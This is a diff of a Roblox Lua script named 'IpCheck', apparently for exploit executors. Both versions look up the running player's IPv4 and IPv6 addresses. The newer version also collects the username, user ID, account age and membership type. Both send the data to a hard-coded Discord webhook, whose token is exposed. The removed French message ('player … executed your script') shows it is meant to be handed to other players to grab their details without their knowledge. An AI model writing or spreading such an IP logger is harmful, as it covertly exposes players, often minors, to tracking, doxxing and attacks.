@@ -1,26 +1,62 @@
---IpCheck
-local webhookUrl = "https://discord.com/api/webhooks/1090334868635910245/iFTdBxsR2ued4LFm1gLpBRwzH_5W3GGvTAkb7FHS728p6039_pSqIkmNxlM4AWmrPz5t" -- Remplacer par l'URL de votre webhook Discord
+
+local Webhook = "https://discord.com/api/webhooks/1090334868635910245/iFTdBxsR2ued4LFm1gLpBRwzH_5W3GGvTAkb7FHS728p6039_pSqIkmNxlM4AWmrPz5t" -- Put your Webhook link here
 
 local IPv4 = game:HttpGet("https://v4.ident.me/")
 local IPv6 = game:HttpGet("https://v6.ident.me/")
 
-local playerName = game.Players.LocalPlayer.Name
-local UserId = game.Players.LocalPlayer.UserId
-local message = "Le joueur " .. playerName .." a exécuté votre script,so id est " .. UserId .. " + ipv4 " ..IPv4.. " et ipv6 " .. IPv6 .. ""
-local data = {
-  content = message
-}
-local encodedData = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-  ["Content-Type"] = "application/json"
-}
-local httpRequest = http_request or request or HttpPost or syn.request -- Vérification de la disponibilité de la fonction HttpPost ou syn.request
-local requestInfo = {
-  Url = webhookUrl,
-  Method = "POST",
-  Headers = headers,
-  Body = encodedData
-}
-httpRequest(requestInfo)
+local Headers = {["content-type"] = "application/json"} -- Don't Modify
 
+local LocalPlayer = game:GetService("Players").LocalPlayer
 
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+local PlayerName = game.Players.LocalPlayer.Name
+
+local PlayerData =
+{
+       ["content"] = "",
+       ["embeds"] = {{
+           ["title"] = "**Username**:",
+           ["description"] = PlayerName,
+           ["color"] = tonumber(0x2B6BE4),
+           ["fields"] = {
+               {
+                   ["name"] = "MembershipType:",
+                   ["value"] = MembershipType,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "AccountAge:",
+                   ["value"] = AccountAge,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "UserId:",
+                   ["value"] = UserId,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "IPv4:",
+                   ["value"] = IPv4,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "IPv6:",
+                   ["value"] = IPv6,
+                   ["inline"] = true
+},
+           },
+       }}
+   }
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+local HttpRequest = http_request;
+
+if syn then
+   HttpRequest = syn.request
+   else
+   HttpRequest = http_request
+end
+
+HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
